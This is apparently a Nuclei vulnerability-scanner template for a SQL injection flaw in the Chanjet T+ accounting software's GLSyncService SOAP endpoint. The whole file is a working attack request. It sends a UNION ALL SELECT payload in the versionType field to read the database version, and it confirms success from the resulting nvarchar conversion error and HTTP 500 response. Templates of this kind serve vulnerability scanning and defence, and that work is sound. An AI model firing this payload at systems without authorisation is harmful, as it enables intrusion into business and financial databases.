nuclei_rules/ChangJieTong-TPlus-GLSyncService-sqlInjection.yaml

id: ChangJieTong-TPlus-GLSyncService-sqlInjection

info:
  name: ChangJieTong-TPlus-GLSyncService-sqlInjection
  author: iSee857
  severity: high
  description: ChangJieTong-TPlus-GLSyncService-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /tplus/GLSyncService.asmx HTTP/1.1
        Host: {{Host}}
        Accept: */*
        Content-type: text/xml
        SOAPAction: http://www.chanjet.com/GetSourceAccountDataTable
        Connection: close

        <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <GetSourceAccountDataTable xmlns="http://www.chanjet.com/">      <versionType>' UNION ALL SELECT NULL,@@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VsIH</versionType>    </GetSourceAccountDataTable>  </soap:Body></soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "转换"
          - "nvarchar"
        condition: and
        part: body

      - type: status
        status:
          - 500